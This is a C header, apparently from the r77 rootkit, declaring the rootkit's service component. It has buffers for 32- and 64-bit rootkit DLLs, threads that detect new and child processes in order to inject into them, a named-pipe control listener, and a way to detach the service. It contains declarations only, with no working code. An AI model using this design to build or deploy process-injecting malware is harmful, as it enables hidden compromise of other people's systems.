#include "r77mindef.h"
#include "ReflectiveDllMain.h"

/// <summary>
/// The 32-bit r77 DLL.
/// </summary>
LPBYTE RootkitDll32;
/// <summary>
/// The size of the 32-bit r77 DLL.
/// </summary>
DWORD RootkitDll32Size;
/// <summary>
/// The 64-bit r77 DLL.
/// </summary>
LPBYTE RootkitDll64;
/// <summary>
/// The size of the 64-bit r77 DLL.
/// </summary>
DWORD RootkitDll64Size;

/// <summary>
/// The thread that listens for notifications about created child processes.
/// </summary>
HANDLE ChildProcessListenerThread;
/// <summary>
/// The thread that checks for new processes every 100 ms.
/// </summary>
HANDLE NewProcessListenerThread;
/// <summary>
/// The thread that listens for commands on the control pipe.
/// </summary>
HANDLE ControlPipeListenerThread;
/// <summary>
/// Specifies whether to temporarily pause injection.
/// <para>This flag is related to the CONTROL_R77_PAUSE_INJECTION control code.</para>
/// </summary>
BOOL IsInjectionPaused;

BOOL WINAPI DllMain(_In_ HINSTANCE module, _In_ DWORD reason, _In_ LPVOID reserved);

/// <summary>
/// Initializes the r77 service and writes the r77 header.
/// </summary>
/// <returns>
/// TRUE, if the r77 service was successfully loaded;
/// otherwise, FALSE.
/// </returns>
BOOL InitializeService();
/// <summary>
/// Detaches the r77 service cfrom this process.
/// </summary>
VOID UninitializeService();
/// <summary>
/// A function that can be invoked using NtCreateThreadEx to detach the r77 service from this process.
/// <para>The address of this function is written to the r77 header.</para>
/// </summary>
static VOID DetachService();

/// <summary>
/// Callback for newly created child processes that should be injected.
/// </summary>
/// <param name="processId">The process ID of the new process.</param>
VOID ChildProcessCallback(DWORD processId);
/// <summary>
/// Callback for new processes that should be injected.
/// </summary>
/// <param name="processId">The process ID of the new process.</param>
VOID NewProcessCallback(DWORD processId);
/// <summary>
/// Callback for commands sent to the r77 service.
/// </summary>
/// <param name="controlCode">The control code of the command.</param>
/// <param name="pipe">A handle to the named pipe that contains data about the command.</param>
VOID ControlCallback(DWORD controlCode, HANDLE pipe);